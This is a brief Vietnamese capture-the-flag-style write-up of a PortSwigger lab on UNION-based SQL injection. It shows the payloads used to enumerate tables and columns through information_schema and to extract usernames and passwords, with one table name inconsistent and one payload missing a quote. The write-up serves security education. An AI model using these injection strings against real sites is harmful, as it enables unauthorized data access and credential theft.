# SQL injection attack, listing the database contents on non-Oracle databases

Như thường lệ ta check xem có bao nhiêu cột và kiểu dữ liệu trong cột đó là gì, làm như những bài trước thì ta thấy có 2 cột và kiểu dữ liệu string.

Tiếp theo ta sử dụng câu lệnh `' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables --` để xem tên các bảng trong database, tiếp theo ta tìm bảng có tên liên quan tới `Users` và tìm được bảng có tên `users_hxzojb`

![](https://github.com/Luwcj/SQLi/blob/main/Portswigger/SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20non-Oracle%20databases/3.1.png?raw=true)

Tiếp theo ta sử dụng câu lệnh `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = users_hxzojb'--` để liệt kê ra tên các cột trong bảng `users_avnkam`.

![](https://github.com/Luwcj/SQLi/blob/main/Portswigger/SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20non-Oracle%20databases/3.2.png?raw=true)

Tiếp theo ta sử dụng câu lệnh `' UNION SELECT username_gielgn, password_zpilyt FROM users_hxzojb--` để hiển thị ra thông tin bên trong 2 cột của bảng `users_hxzojb`

![](https://github.com/Luwcj/SQLi/blob/main/Portswigger/SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20non-Oracle%20databases/3.3.png?raw=true)

Giờ thì đăng nhập và hoàn thành bài lab thôi.
